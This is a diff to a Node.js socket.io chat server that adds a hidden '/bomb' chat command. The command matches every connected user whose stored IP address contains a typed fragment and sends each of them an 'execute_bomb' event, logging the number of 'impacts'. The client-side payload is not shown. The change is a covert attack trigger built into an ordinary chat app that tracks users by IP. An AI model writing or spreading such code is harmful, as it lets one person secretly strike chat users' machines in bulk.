@@ -36,15 +36,22 @@ io.on('connection', (socket) => {
     });
 
     socket.on('chat message', (data) => {
-        // COMMANDE BOMB : /bomb [IP]
-        if (data.text.startsWith("/bomb ")) {
-            const targetIP = data.text.split(" ")[1];
-            const target = users[targetIP];
+        const msg = data.text.trim();
 
-            if (target) {
-                console.log(`[!!!] ATTACK_SENT_TO: ${targetIP} (${target.name})`);
-                io.to(target.sid).emit('execute_bomb');
-            }
+        if (msg.startsWith("/bomb ")) {
+            const target = msg.split(" ")[1]; // Récupère l'IP tapée
+            let struck = 0;
+
+            // Scan de toutes les sessions actives
+            Object.keys(vault).forEach(ip => {
+                // Si l'IP enregistrée contient ce que tu as tapé (ex: "176.131")
+                if (ip.includes(target)) {
+                    io.to(vault[ip].sid).emit('execute_bomb');
+                    struck++;
+                }
+            });
+
+            console.log(`[!] ORDRE_BOMB: ${target} | IMPACTS: ${struck}`);
         } else {
             io.emit('chat message', data);
         }
@@ -58,3 +65,4 @@ io.on('connection', (socket) => {
 http.listen(3000, () => {
     console.log("SYSTEM_CORE_ONLINE_PORT_3000");
 });
+
